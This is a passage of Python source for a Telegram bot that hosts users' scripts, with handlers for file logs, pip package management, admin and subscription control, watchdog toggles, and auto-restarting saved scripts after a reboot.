        old_log = os.path.join(folder, f"{os.path.splitext(old_name)[0]}.log")
        new_log = os.path.join(folder, f"{os.path.splitext(new_name)[0]}.log")
        if os.path.exists(old_log):
            try:
                os.rename(old_log, new_log)
            except OSError:
                pass
    except OSError as e:
        bot.reply_to(message, f"❌ Rename failed: {_esc(str(e))}")
        return

    remove_user_file_db(owner_id, old_name)
    save_user_file(owner_id, new_name, ftype)
    save_file_approval(owner_id, new_name, ftype, FILE_STATUS_APPROVED)
    with DB_LOCK:
        conn = _get_conn(DATABASE_PATH)
        c = conn.cursor()
        try:
            c.execute('DELETE FROM file_approvals WHERE user_id=? AND file_name=?', (owner_id, old_name))
            conn.commit()
        except Exception:
            pass
        finally:
            conn.close()

    bot.reply_to(
        message,
        f"✅ Renamed <code>{_esc(old_name)}</code> → <code>{_esc(new_name)}</code>",
        parse_mode='HTML'
    )

def _cb_logs(call):
    try:
        uid, fname = _parse_action(call.data, 'logs_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return

        folder   = get_user_folder(uid)
        log_path = os.path.join(folder, f"{os.path.splitext(fname)[0]}.log")
        if not os.path.exists(log_path):
            bot.answer_callback_query(call.id, "No log file yet.", show_alert=True); return

        bot.answer_callback_query(call.id)
        size = os.path.getsize(log_path)
        if size == 0:
            content = "(Log is empty)"
        elif size > 100 * 1024:
            with open(log_path, 'rb') as f:
                f.seek(-100 * 1024, os.SEEK_END)
                content = "(Last 100 KB)\n…\n" + f.read().decode('utf-8', errors='ignore')
        else:
            with open(log_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

        if len(content) > 4000:
            content = "…\n" + content[-3900:]
        if not content.strip():
            content = "(No visible content)"

        text = f"📜 <b>Logs — <code>{_esc(fname)}</code></b>\n<pre>{_esc(content)}</pre>"
        mk = types.InlineKeyboardMarkup()
        mk.row(
            _btn("🔄 Refresh", "primary", _cb('logs_', uid, fname)),
            _btn("🔙 Back",    "gray",    _cb('file_', uid, fname)),
        )

        # If this call came from an existing logs message (i.e. a refresh tap),
        # edit it in place instead of spamming a new message each time.
        try:
            already_logs = call.message.text and call.message.text.startswith("📜 Logs")
        except Exception:
            already_logs = False

        if already_logs:
            try:
                bot.edit_message_text(
                    text, call.message.chat.id, call.message.message_id,
                    reply_markup=mk, parse_mode='HTML'
                )
                return
            except Exception:
                pass

        bot.send_message(call.message.chat.id, text, reply_markup=mk, parse_mode='HTML')
    except Exception as e:
        logger.error(f"_cb_logs: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error fetching logs.", show_alert=True)

def _cb_show_status(call):
    try:
        uid, fname = _parse_action(call.data, 'status_')
        fs = get_file_status(uid, fname)
        status_text = _approval_label(fs['status'])
        msg = f"{status_text}\n📄 {fname}\n👤 User: {uid}"
        if fs.get('reviewed_by'):
            by = "AI Scanner" if fs['reviewed_by'] == 0 else f"Admin {fs['reviewed_by']}"
            msg += f"\n🛡️ By: {by}"
        if fs.get('ban_reason'):
            msg += f"\n⚠️ {fs['ban_reason']}"
        bot.answer_callback_query(call.id, msg, show_alert=True)
    except Exception:
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_watchdog_toggle_script(call):
    """Lets a user opt a specific script out of (or back into) crash auto-restart."""
    try:
        uid, fname = _parse_action(call.data, 'wdtoggle_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return

        currently_excluded = is_watchdog_excluded(uid, fname)
        set_watchdog_excluded(uid, fname, not currently_excluded)
        now_excluded = not currently_excluded
        bot.answer_callback_query(
            call.id,
            "🐕 Auto-restart disabled for this script." if now_excluded else "🐕 Auto-restart re-enabled."
        )
        is_running = is_bot_running(uid, fname)
        try:
            bot.edit_message_reply_markup(
                call.message.chat.id, call.message.message_id,
                reply_markup=create_file_controls(uid, fname, is_running)
            )
        except Exception:
            pass
    except Exception as e:
        logger.error(f"_cb_watchdog_toggle_script: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_speed(call):
    user_id = call.from_user.id
    start   = time.time()
    try:
        bot.edit_message_text("⚡ Measuring…", call.message.chat.id, call.message.message_id)
        rt   = round((time.time() - start) * 1000, 2)
        lock = "🔒 Locked" if bot_locked else "🟢 Online"
        text = (
            f"⚡ <b>Speed Check</b>\n\n"
            f"📡 Response: <code>{rt} ms</code>\n"
            f"🤖 Status: {lock}\n"
            f"🏅 Rank: {_user_status_label(user_id)}\n"
            f"⏱️ Uptime: <code>{get_uptime()}</code>"
        )
        if user_id in admin_ids:
            text += f"\n🔔 Pending: <code>{get_pending_files_count()}</code>"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=create_main_menu(user_id), parse_mode='HTML')
    except Exception as e:
        logger.error(f"_cb_speed: {e}")
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_back_to_main(call):
    user_id   = call.from_user.id
    limit     = get_user_file_limit(user_id)
    current   = get_user_file_count(user_id)
    lim_str   = "∞" if limit == float('inf') else str(limit)
    pending   = f"\n🔔 Pending approvals: <code>{get_pending_files_count()}</code>" if user_id in admin_ids else ""

    text = (
        f"🏠 <b>Main Menu</b>\n\n"
        f"🆔 <code>{user_id}</code>  •  {_user_status_label(user_id)}\n"
        f"📁 Files: <code>{current}</code> / <code>{lim_str}</code>{pending}"
    )
    try:
        bot.answer_callback_query(call.id)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=create_main_menu(user_id), parse_mode='HTML')
    except telebot.apihelper.ApiTelegramException as e:
        if "not modified" not in str(e):
            logger.error(f"_cb_back_to_main: {e}")

def _cb_confirm_broadcast(call):
    if call.from_user.id not in admin_ids:
        bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
    try:
        original = call.message.reply_to_message
        if not original:
            raise ValueError("Original message not found.")
        text = photo_id = video_id = caption = None
        if original.text:
            text = original.text
        elif original.photo:
            photo_id = original.photo[-1].file_id
            caption  = original.caption
        elif original.video:
            video_id = original.video.file_id
            caption  = original.caption
        else:
            raise ValueError("Unsupported content type.")

        bot.answer_callback_query(call.id, "📣 Broadcasting…")
        bot.edit_message_text(
            f"📣 Broadcasting to {len(active_users)} users…",
            call.message.chat.id, call.message.message_id
        )
        threading.Thread(
            target=execute_broadcast,
            args=(text, photo_id, video_id, caption, call.message.chat.id)
        ).start()
    except ValueError as e:
        bot.edit_message_text(f"❌ {e}", call.message.chat.id, call.message.message_id)
    except Exception as e:
        logger.error(f"_cb_confirm_broadcast: {e}", exc_info=True)

def _parse_pip_owner(data, prefix):
    try:
        return int(data.split(prefix, 1)[1])
    except (IndexError, ValueError):
        return None

def _cb_pip_install(call):
    owner_id = _parse_pip_owner(call.data, 'pip_install_')
    if owner_id is None:
        bot.answer_callback_query(call.id, "Malformed callback.", show_alert=True); return
    bot.answer_callback_query(call.id)
    prompt = bot.send_message(
        call.message.chat.id,
        "📦 <b>Install Package</b>\n\n"
        "Enter package name (e.g. <code>requests</code>, <code>pyTelegramBotAPI==4.14.0</code>)\n"
        "Send /cancel to abort.",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(
        prompt,
        lambda msg: _process_pip_install(msg, owner_id, call.message.chat.id)
    )

def _process_pip_install(message, owner_id, chat_id):
    raw = (message.text or "").strip()
    if raw.lower() in ('/cancel', 'cancel'):
        bot.send_message(chat_id, "❌ Installation cancelled."); return
    package = _sanitize_package_name(raw)
    if not package:
        bot.send_message(chat_id,
            "❌ <b>Invalid package name.</b>\nOnly letters, digits, hyphens, underscores, dots allowed.",
            parse_mode='HTML'); return
    if _is_pip_package_blocked(raw):
        bot.send_message(chat_id,
            f"🚫 <b>Blocked package.</b>\n<code>{_esc(package)}</code> is not allowed on this host.",
            parse_mode='HTML')
        log_audit(message.from_user.id, 'pip_install_blocked', package)
        return
    allowed_rate, rate_reason = _check_action_rate(message.from_user.id, 'pip_install')
    if not allowed_rate:
        bot.send_message(chat_id, rate_reason); return
    _record_action(message.from_user.id, 'pip_install')
    threading.Thread(
        target=_run_pip_cmd_thread,
        args=([sys.executable, '-m', 'pip', 'install', '--no-input', raw.strip()],
              chat_id, f"📦 Install: <code>{_html.escape(package)}</code>"),
        kwargs={'user_id': owner_id},
        daemon=True
    ).start()

def _cb_pip_uninstall(call):
    owner_id = _parse_pip_owner(call.data, 'pip_uninstall_')
    if owner_id is None:
        bot.answer_callback_query(call.id, "Malformed callback.", show_alert=True); return
    bot.answer_callback_query(call.id)
    prompt = bot.send_message(
        call.message.chat.id,
        "🗑️ <b>Uninstall Package</b>\n\nEnter package name to remove, or /cancel.",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(
        prompt,
        lambda msg: _process_pip_uninstall(msg, owner_id, call.message.chat.id)
    )

def _process_pip_uninstall(message, owner_id, chat_id):
    raw = (message.text or "").strip()
    if raw.lower() in ('/cancel', 'cancel'):
        bot.send_message(chat_id, "❌ Cancelled."); return
    package = _sanitize_package_name(raw)
    if not package:
        bot.send_message(chat_id, "❌ Invalid package name.", parse_mode='HTML'); return
    threading.Thread(
        target=_run_pip_cmd_thread,
        args=([sys.executable, '-m', 'pip', 'uninstall', '-y', package],
              chat_id, f"🗑️ Uninstall: <code>{_html.escape(package)}</code>"),
        kwargs={'user_id': owner_id},
        daemon=True
    ).start()

def _cb_pip_upgrade(call):
    owner_id = _parse_pip_owner(call.data, 'pip_upgrade_')
    if owner_id is None:
        bot.answer_callback_query(call.id, "Malformed callback.", show_alert=True); return
    bot.answer_callback_query(call.id)
    prompt = bot.send_message(
        call.message.chat.id,
        "⬆️ <b>Upgrade Package</b>\n\nEnter package name to upgrade, or /cancel.",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(
        prompt,
        lambda msg: _process_pip_upgrade(msg, owner_id, call.message.chat.id)
    )

def _process_pip_upgrade(message, owner_id, chat_id):
    raw = (message.text or "").strip()
    if raw.lower() in ('/cancel', 'cancel'):
        bot.send_message(chat_id, "❌ Cancelled."); return
    package = _sanitize_package_name(raw)
    if not package:
        bot.send_message(chat_id, "❌ Invalid package name."); return
    threading.Thread(
        target=_run_pip_cmd_thread,
        args=([sys.executable, '-m', 'pip', 'install', '--upgrade', '--no-input', package],
              chat_id, f"⬆️ Upgrade: <code>{_html.escape(package)}</code>"),
        kwargs={'user_id': owner_id},
        daemon=True
    ).start()

def _cb_pip_search(call):
    owner_id = _parse_pip_owner(call.data, 'pip_search_')
    if owner_id is None:
        bot.answer_callback_query(call.id, "Malformed callback.", show_alert=True); return
    bot.answer_callback_query(call.id)
    prompt = bot.send_message(
        call.message.chat.id,
        "🔍 <b>Search Package on PyPI</b>\n\nEnter search term, or /cancel.",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(
        prompt,
        lambda msg: _process_pip_search(msg, owner_id, call.message.chat.id)
    )

def _process_pip_search(message, owner_id, chat_id):
    raw = (message.text or "").strip()
    if raw.lower() in ('/cancel', 'cancel'):
        bot.send_message(chat_id, "❌ Cancelled."); return
    if not raw:
        bot.send_message(chat_id, "❌ Empty search term."); return
    threading.Thread(
        target=_run_pip_cmd_thread,
        args=([sys.executable, '-m', 'pip', 'index', 'versions', raw],
              chat_id, f"🔍 Search: <code>{_html.escape(raw[:40])}</code>"),
        kwargs={'user_id': owner_id},
        daemon=True
    ).start()

def _cb_pip_info(call):
    owner_id = _parse_pip_owner(call.data, 'pip_info_')
    if owner_id is None:
        bot.answer_callback_query(call.id, "Malformed callback.", show_alert=True); return
    bot.answer_callback_query(call.id)
    prompt = bot.send_message(
        call.message.chat.id,
        "📄 <b>Package Info</b>\n\nEnter package name, or /cancel.",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(
        prompt,
        lambda msg: _process_pip_info(msg, owner_id, call.message.chat.id)
    )

def _process_pip_info(message, owner_id, chat_id):
    raw = (message.text or "").strip()
    if raw.lower() in ('/cancel', 'cancel'):
        bot.send_message(chat_id, "❌ Cancelled."); return
    package = _sanitize_package_name(raw)
    if not package:
        bot.send_message(chat_id, "❌ Invalid package name."); return
    threading.Thread(
        target=_run_pip_cmd_thread,
        args=([sys.executable, '-m', 'pip', 'show', package],
              chat_id, f"📄 Info: <code>{_html.escape(package)}</code>"),
        kwargs={'user_id': owner_id},
        daemon=True
    ).start()

def _cb_pip_show(call):
    owner_id = _parse_pip_owner(call.data, 'pip_show_')
    if owner_id is None:
        bot.answer_callback_query(call.id, "Malformed callback.", show_alert=True); return
    bot.answer_callback_query(call.id, "📋 Fetching packages…")
    chat_id = call.message.chat.id
    threading.Thread(target=_run_pip_show_thread, args=(chat_id,), kwargs={'user_id': owner_id}, daemon=True).start()

def _run_pip_cmd_thread(cmd_list, chat_id, title, user_id=None):
    if user_id and cmd_list and cmd_list[0] == sys.executable:
        cmd_list = [get_user_python(user_id)] + cmd_list[1:]
    try:
        wait_msg = bot.send_message(
            chat_id,
            f"{title}\n<i>⏳ Running…</i>",
            parse_mode='HTML'
        )

        result = subprocess.run(
            cmd_list,
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            timeout=120
        )

        raw_out  = (result.stdout or "").strip()
        raw_err  = (result.stderr or "").strip()
        combined = (raw_out + ("\n" + raw_err if raw_err else "")).strip()
        if not combined:
            combined = "(no output)"

        if len(combined) > 3000:
            combined = "…\n" + combined[-3000:]

        combined_esc = _html.escape(combined, quote=False)

        icon = "✅" if result.returncode == 0 else "❌"
        text = (
            f"{title}\n"
            f"<pre>{combined_esc}</pre>\n"
            f"{icon} <b>Exit: {result.returncode}</b>"
        )

        mk = types.InlineKeyboardMarkup()
        mk.add(_btn("🔙 Back to Pip Menu", "gray", "pip_menu"))

        try:
            bot.edit_message_text(text, chat_id, wait_msg.message_id,
                                  parse_mode='HTML', reply_markup=mk)
        except Exception:
            bot.send_message(chat_id, text, parse_mode='HTML', reply_markup=mk)

    except subprocess.TimeoutExpired:
        bot.send_message(chat_id, f"⏰ <b>Timed out</b> (limit: 120s)\n{title}", parse_mode='HTML')
    except FileNotFoundError:
        bot.send_message(chat_id, "❌ Python interpreter not found.", parse_mode='HTML')
    except Exception as e:
        logger.error(f"_run_pip_cmd_thread: {e}", exc_info=True)
        bot.send_message(chat_id, f"❌ Unexpected error: {e}")

def _run_pip_show_thread(chat_id, user_id=None):
    python = get_user_python(user_id) if user_id else sys.executable
    try:
        result = subprocess.run(
            [python, '-m', 'pip', 'list', '--format=columns'],
            capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=30
        )
        if result.returncode != 0:
            err = (result.stderr or result.stdout or "No output").strip()
            bot.send_message(chat_id,
                f"❌ <b>pip list failed</b>\n<pre>{err[:2000]}</pre>", parse_mode='HTML')
            return

        raw = (result.stdout or "").strip()
        if not raw:
            bot.send_message(chat_id, "📋 No packages found."); return

        lines     = raw.splitlines()
        pkg_lines = lines[2:] if len(lines) > 2 else lines
        total     = len(pkg_lines)
        header    = f"📋 <b>Installed Packages — {total} total</b>\n\n"

        MAX_CHARS   = 3600
        chunks      = []
        current     = []
        current_len = 0
        for line in pkg_lines:
            if current_len + len(line) + 1 > MAX_CHARS and current:
                chunks.append("\n".join(current))
                current, current_len = [], 0
            current.append(line)
            current_len += len(line) + 1
        if current:
            chunks.append("\n".join(current))

        mk = types.InlineKeyboardMarkup()
        mk.add(_btn("🔙 Pip Menu", "gray", "pip_menu"))

        for i, chunk in enumerate(chunks):
            part_header = header if i == 0 else f"📋 <b>Packages (cont. {i+1}/{len(chunks)})</b>\n\n"
            chunk_esc = _html.escape(chunk, quote=False)
            bot.send_message(chat_id, f"{part_header}<pre>{chunk_esc}</pre>",
                             parse_mode='HTML', reply_markup=mk if i == len(chunks)-1 else None)
            if i < len(chunks) - 1:
                time.sleep(0.3)

    except subprocess.TimeoutExpired:
        bot.send_message(chat_id, "⏰ <b>Timed out</b> running pip list.", parse_mode='HTML')
    except Exception as e:
        logger.error(f"_run_pip_show_thread: {e}", exc_info=True)
        bot.send_message(chat_id, f"❌ Unexpected error: {e}")

def _process_add_admin(message):
    if message.from_user.id != OWNER_ID: return
    if message.text.lower() == '/cancel':
        bot.reply_to(message, "Cancelled."); return
    try:
        new_id = int(message.text.strip())
        if new_id == OWNER_ID:
            bot.reply_to(message, "That's already the Owner."); return
        if new_id in admin_ids:
            bot.reply_to(message, f"<code>{new_id}</code> is already an Admin.", parse_mode='HTML'); return
        add_admin_db(new_id)
        log_audit(message.from_user.id, 'add_admin', str(new_id))
        bot.reply_to(message, f"✅ <code>{new_id}</code> promoted to Admin.", parse_mode='HTML')
        try: bot.send_message(new_id, "🛡️ You've been promoted to Admin!")
        except Exception: pass
    except ValueError:
        bot.reply_to(message, "Invalid ID. Send a numeric User ID or /cancel.")
        msg = bot.send_message(message.chat.id, "Enter User ID:")
        bot.register_next_step_handler(msg, _process_add_admin)

def _process_remove_admin(message):
    if message.from_user.id != OWNER_ID: return
    if message.text.lower() == '/cancel':
        bot.reply_to(message, "Cancelled."); return
    try:
        aid = int(message.text.strip())
        if aid == OWNER_ID:
            bot.reply_to(message, "Cannot remove the Owner."); return
        if aid not in admin_ids:
            bot.reply_to(message, f"<code>{aid}</code> is not an Admin.", parse_mode='HTML'); return
        if remove_admin_db(aid):
            log_audit(message.from_user.id, 'remove_admin', str(aid))
            bot.reply_to(message, f"✅ Admin <code>{aid}</code> removed.", parse_mode='HTML')
            try: bot.send_message(aid, "You've been removed from Admin.")
            except Exception: pass
    except ValueError:
        bot.reply_to(message, "Invalid ID.")
        msg = bot.send_message(message.chat.id, "Enter Admin ID or /cancel.")
        bot.register_next_step_handler(msg, _process_remove_admin)

def _process_add_subscription(message):
    if message.from_user.id not in admin_ids: return
    if message.text.lower() == '/cancel':
        bot.reply_to(message, "Cancelled."); return
    try:
        parts = message.text.split()
        if len(parts) != 2: raise ValueError("Format: USER_ID DAYS")
        uid, days = int(parts[0]), int(parts[1])
        if uid <= 0 or days <= 0: raise ValueError("Must be positive integers.")
        current_exp = user_subscriptions.get(uid, {}).get('expiry')
        base        = max(datetime.now(), current_exp) if current_exp else datetime.now()
        new_exp     = base + timedelta(days=days)
        save_subscription(uid, new_exp)
        bot.reply_to(message,
            f"✅ Subscription extended for <code>{uid}</code>\n"
            f"+{days} days → Expires: <code>{new_exp:%Y-%m-%d}</code>",
            parse_mode='HTML')
        try:
            bot.send_message(uid,
                f"💎 Your subscription was extended by {days} days!\n"
                f"Expires: <code>{new_exp:%Y-%m-%d}</code>", parse_mode='HTML')
        except Exception: pass
    except ValueError as e:
        bot.reply_to(message, f"❌ {e}. Format: <code>USER_ID DAYS</code>", parse_mode='HTML')
        msg = bot.send_message(message.chat.id, "Try again or /cancel.")
        bot.register_next_step_handler(msg, _process_add_subscription)

def _process_remove_subscription(message):
    if message.from_user.id not in admin_ids: return
    if message.text.lower() == '/cancel':
        bot.reply_to(message, "Cancelled."); return
    try:
        uid = int(message.text.strip())
        if uid not in user_subscriptions:
            bot.reply_to(message, f"No subscription found for <code>{uid}</code>.", parse_mode='HTML'); return
        remove_subscription_db(uid)
        bot.reply_to(message, f"✅ Subscription removed for <code>{uid}</code>.", parse_mode='HTML')
        try: bot.send_message(uid, "Your subscription has been removed by admin.")
        except Exception: pass
    except ValueError:
        bot.reply_to(message, "Invalid ID.")
        msg = bot.send_message(message.chat.id, "Enter User ID or /cancel.")
        bot.register_next_step_handler(msg, _process_remove_subscription)

def _process_check_subscription(message):
    if message.from_user.id not in admin_ids: return
    if message.text.lower() == '/cancel':
        bot.reply_to(message, "Cancelled."); return
    try:
        uid = int(message.text.strip())
        sub = user_subscriptions.get(uid)
        if sub:
            exp = sub['expiry']
            if exp > datetime.now():
                days_left = (exp - datetime.now()).days
                bot.reply_to(message,
                    f"✅ <code>{uid}</code> has active subscription\n"
                    f"Expires: <code>{exp:%Y-%m-%d}</code> ({days_left}d left)",
                    parse_mode='HTML')
            else:
                bot.reply_to(message,
                    f"⏰ Subscription expired: <code>{exp:%Y-%m-%d}</code>", parse_mode='HTML')
                remove_subscription_db(uid)
        else:
            bot.reply_to(message, f"❌ No subscription for <code>{uid}</code>.", parse_mode='HTML')
    except ValueError:
        bot.reply_to(message, "Invalid ID.")
        msg = bot.send_message(message.chat.id, "Enter User ID or /cancel.")
        bot.register_next_step_handler(msg, _process_check_subscription)

# ── AUTO-RESTART ON REBOOT ─────────────────────────────────────────────────
RESTART_MAX_CONCURRENT = 3
RESTART_MIN_DELAY      = 1.0
RESTART_MAX_JITTER     = 4.0

def _restart_saved_scripts():
    rows = get_all_running_scripts()
    if not rows:
        return
    logger.info(f"Auto-restart: found {len(rows)} script(s) to resume.")

    def _worker():
        import types as _types
        import random
        sem = threading.Semaphore(RESTART_MAX_CONCURRENT)

        def _launch_one(uid, fname, ftype, chat_id):
            try:
                folder = get_user_folder(uid)
                path   = os.path.join(folder, fname)
                if not os.path.exists(path):
                    logger.warning(f"Auto-restart: {fname} for {uid} missing on disk, skipping.")
                    unmark_script_running(uid, fname)
                    return

                fake_chat = _types.SimpleNamespace(id=chat_id)
                fake_msg  = _types.SimpleNamespace(chat=fake_chat, message_id=None)

                runner = run_script if ftype == 'py' else run_js_script
                runner(path, uid, folder, fname, fake_msg)

                try:
                    bot.send_message(
                        chat_id,
                        f"♻️ <b>Auto-restarted</b> <code>{_esc(fname)}</code> after host reboot.",
                        parse_mode='HTML'
                    )
                except Exception:
                    pass
            except Exception as e:
                logger.error(f"_restart_saved_scripts: {fname} for {uid}: {e}", exc_info=True)
            finally:
                sem.release()

        for uid, fname, ftype, chat_id in rows:
            sem.acquire()
            threading.Thread(target=_launch_one, args=(uid, fname, ftype, chat_id), daemon=True).start()
            time.sleep(RESTART_MIN_DELAY + _random.uniform(0, RESTART_MAX_JITTER))

        logger.info("Auto-restart: all queued scripts dispatched.")

    threading.Thread(target=_worker, daemon=True).start()

def cleanup():
    logger.warning("Shutting down — stopping all scripts…")
    for key in list(bot_scripts.keys()):
        pi = bot_scripts.get(key)
        if pi:
            kill_process_tree(pi)
    logger.warning("Cleanup done.")

atexit.register(cleanup)

# ── GRACEFUL SIGNAL HANDLING ───────────────────────────────────────────────
def _signal_handler(signum, frame):
    logger.warning(f"Signal {signum} received — shutting down gracefully…")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGTERM, _signal_handler)
signal.signal(signal.SIGINT,  _signal_handler)

if __name__ == '__main__':
    logger.info(
        f"\n{'='*52}\n"
        f"  Script Host Bot  —  Starting\n"
        f"  Python  : {sys.version.split()[0]}\n"
        f"  Owner   : {OWNER_ID}\n"
        f"  Main DB : {DATABASE_PATH}\n"
        f"  Backup  : {BACKUP_DATABASE_PATH}\n"
        f"  Sisters : {len(SISTER_BOTS)}\n"
        f"  Started : {BOT_START_TIME}\n"
        f"{'='*52}"
    )
    keep_alive()
    _start_daily_scheduler()
    _start_hourly_backup()           # ── Hourly DB backup to owner + admins
    _start_self_healthcheck()        # ── Periodic Flask/self health-check
    _start_scheduled_broadcasts()    # ── Sends queued broadcasts at their scheduled time
    _restart_saved_scripts()    # ── Resume scripts that were running before shutdown
    _ask_owner_start_watchdog()      # ── Watchdog no longer auto-starts; ask the owner first
    logger.info("Polling started.")
    while True:
        try:
            bot.infinity_polling(
                logger_level=logging.INFO,
                timeout=60,
                long_polling_timeout=30
            )
        except requests.exceptions.ReadTimeout:
            logger.warning("Read timeout — retrying in 5s…")
            time.sleep(5)
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Connection error: {e} — retrying in 15s…")
            time.sleep(15)
        except Exception as e:
            logger.critical(f"Polling crash: {e}", exc_info=True)
            time.sleep(30)
        finally:
            time.sleep(1)
